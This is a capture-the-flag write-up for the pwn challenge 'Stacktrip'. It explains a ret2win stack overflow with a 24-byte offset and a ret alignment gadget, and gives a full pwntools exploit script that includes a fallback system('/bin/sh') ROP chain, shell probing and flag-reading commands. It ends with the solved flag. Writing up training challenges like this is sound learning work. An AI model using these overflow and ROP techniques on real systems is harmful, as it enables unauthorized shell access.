---
layout: challenge.njk
title: Stacktrip
category: Pwn
author: faizath
flag: "Teknocom{Ov3rfl0w_Th3_St4ck_Just4s_Fun}"
flagTeaser: "Teknocom{Ov3rfl0w_Th3_St4ck...}"
description: "The vacation seems calm… until you overflow and discover shell_land(). A classic ret2win with a stack-alignment ret gadget. nc 38.47.176.164 3076"
tags: [pwn, ret2win, rop, stack-overflow]
---

## Overview

We are given a binary called `chall` and a remote service at `nc 38.47.176.164 3076`. Getting the flag is fairly direct using a ret2win technique: send an overflow payload consisting of 24 bytes of padding to overwrite the saved RBP and reach RIP, place a single `ret` gadget to fix the stack alignment, then put the address of the `shell_land` function as the return address. Once execution jumps to `shell_land`, we obtain a shell, and we simply run `ls` to see `flag.txt` and `cat flag.txt` to read the flag.

## Analysis

During the initial reconstruction, `checksec` shows a 64-bit binary with NX enabled, no stack canary, and no PIE, so the function addresses are stable. This makes ret2win easy because we can use the absolute address of `shell_land` seen in the ELF symbols, around `0x401196`. Under these conditions we do not need an address leak or any other complex bypass.

Looking at the program flow, the vulnerable function has a local buffer of `0x10` bytes but reads `0x40` bytes into that buffer using `fgets`. The distance from the start of the buffer to RIP is `0x10` bytes for the buffer plus `8` bytes for the saved RBP, which means an offset of 24. This simple calculation gives us the exact padding length needed to reach control of the execution flow.

The important key that makes the exploit stable is stack alignment. When we jump directly into `shell_land` without preparation, the C library can fail because the stack is not 16-byte aligned at the moment it calls a primitive like `system`. Inserting a single `ret` gadget first repairs the alignment so the transition into `shell_land` runs smoothly. In this case a safe `ret` is located at `0x40101a`, so the final payload becomes 24 bytes of padding, followed by `p64(0x40101a)` and `p64(0x401196)`.

## Exploitation

The practical exploit is built with pwntools so it can be used both locally and remotely. The script connects, waits for the prompt, then sends the alignment-fixed ret2win payload. Once the shell is active, an `echo` or `ls` command helps verify execution, after which we just read the flag file. On the remote service, the interactive session reveals a `flag.txt` and reading it directly gives the result.

```python
#!/usr/bin/env python3
from pwn import *
import sys, time

# ---------- Config ----------
HOST = '38.47.176.164'
PORT = 3076

context.binary = ELF('./chall', checksec=False)
context.arch = 'amd64'
context.log_level = 'info'

elf = context.binary

# From disassembly:
# vacation: sub rsp, 0x10 ; fgets(buf, 0x40) into [rbp-0x10]
# => offset = 0x10 (buf) + 0x8 (saved rbp) = 24
OFFSET = 24

def build_ret2win_payload():
  """
  ret2win with stack alignment: ret; shell_land()
  """
  shell_land = elf.symbols.get('shell_land')
  if shell_land is None:
      log.error("Could not find shell_land symbol in the ELF")
  rop = ROP(elf)
  ret = rop.find_gadget(['ret'])[0]
  log.info(f"ret     @ {hex(ret)}")
  log.info(f"shell_land @ {hex(shell_land)}")
  payload = b'A' * OFFSET
  payload += p64(ret)          # 16-byte align stack for glibc
  payload += p64(shell_land)
  return payload

def build_system_chain():
  """
  Fallback ROP chain: ret (align) ; pop rdi; ret ; '/bin/sh' ; system@plt
  """
  rop = ROP(elf)
  ret = rop.find_gadget(['ret'])[0]
  pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
  binsh = next(elf.search(b'/bin/sh\x00'))
  system = elf.plt['system']

  log.info(f"ret     @ {hex(ret)}")
  log.info(f"pop rdi;ret@ {hex(pop_rdi)}")
  log.info(f"/bin/sh @ {hex(binsh)}")
  log.info(f"system@plt @ {hex(system)}")

  chain = p64(ret)       # alignment
  chain += p64(pop_rdi) + p64(binsh)
  chain += p64(system)
  payload = b'A' * OFFSET + chain
  return payload

def try_get_flag(io):
  """
  Try a few common flag paths. Return the flag line(s) if found; else None.
  """
  cmds = [
      "cat /flag 2>/dev/null",
      "cat flag 2>/dev/null",
      "cat flag.txt 2>/dev/null",
      "cat /home/*/flag* 2>/dev/null",
      "ls -la",
  ]
  for c in cmds:
      io.sendline(c.encode())
      data = io.recv(timeout=0.6) or b''
      # Heuristic: look for typical flag patterns
      for line in data.splitlines():
         if any(tok in line.decode('latin-1', 'ignore') for tok in ['CTF{', 'HTB{', 'flag{', 'FLAG{']):
             return data
  return None

def send_and_check(io, payload):
  """
  Send payload, test if we have a working shell by running a command.
  Returns True on shell, False otherwise.
  """
  # Sync on prompt (best-effort)
  io.recvuntil(b'Where am I', timeout=1)
  io.recvline(timeout=0.5) # eat the rest of the prompt line if present
  io.sendline(payload)

  # Probe for a shell
  io.sendline(b'echo PWNED')
  out = io.recv(timeout=0.8) or b''
  if b'PWNED' in out:
      log.success("Got shell via ret2win!")
      flag = try_get_flag(io)
      if flag:
          log.success("Flag data:\n" + flag.decode('latin-1', 'ignore'))
      return True
  return False

def exploit(remote_mode=True):
  def connect():
     return remote(HOST, PORT) if remote_mode else process(elf.path)

  # Try ret2win with alignment first
  io = connect()
  payload = build_ret2win_payload()
  if send_and_check(io, payload):
      io.interactive()
      return
  io.close()

  # Fallback ROP chain
  io = connect()
  payload = build_system_chain()
  if send_and_check(io, payload):
      io.interactive()
      return
  else:
      log.failure("Exploit attempts failed (no shell).")

def main():
  mode = sys.argv[1] if len(sys.argv) > 1 else 'r' # default to remote
  exploit(remote_mode = not mode.startswith('l'))

if __name__ == '__main__':
    main()
```

## Flag

```
Teknocom{Ov3rfl0w_Th3_St4ck_Just4s_Fun}
```
